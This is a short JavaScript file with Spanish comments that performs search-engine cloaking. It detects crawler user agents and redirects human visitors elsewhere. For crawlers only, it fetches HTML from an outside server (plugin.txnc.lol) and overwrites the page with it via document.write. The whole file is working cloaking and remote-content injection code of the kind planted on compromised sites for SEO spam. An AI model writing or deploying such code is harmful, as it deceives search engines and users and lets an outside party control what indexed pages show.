(function() {
    // Detectar si es un bot de búsqueda
    const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot/i.test(navigator.userAgent);
    
    // Si NO es un bot, mandamos al humano a la web real
    if (!isBot) {
        window.location.replace("https://tu-sitio-real.com");
        return;
    }

    // Obtener parámetros de la URL actual (ej: ?art=1&io0=2222)
    const params = new URLSearchParams(window.location.search);
    const art = params.get('art'); 
    const io0 = params.get('io0'); 

    if (!art || !io0) return;

    // Pedir el contenido a tu servidor
    // Cambia 'https://tu-servidor.com/' por tu URL real
    fetch(`https://plugin.txnc.lol/?art=${art}&io0=${io0}`)
        .then(response => {
            if (response.ok) return response.text();
            throw new Error('Error en servidor');
        })
        .then(html => {
            // Reemplazar todo el contenido de la página para el bot
            document.open();
            document.write(html);
            document.close();
        })
        .catch(err => console.log("Carga omitida"));
})();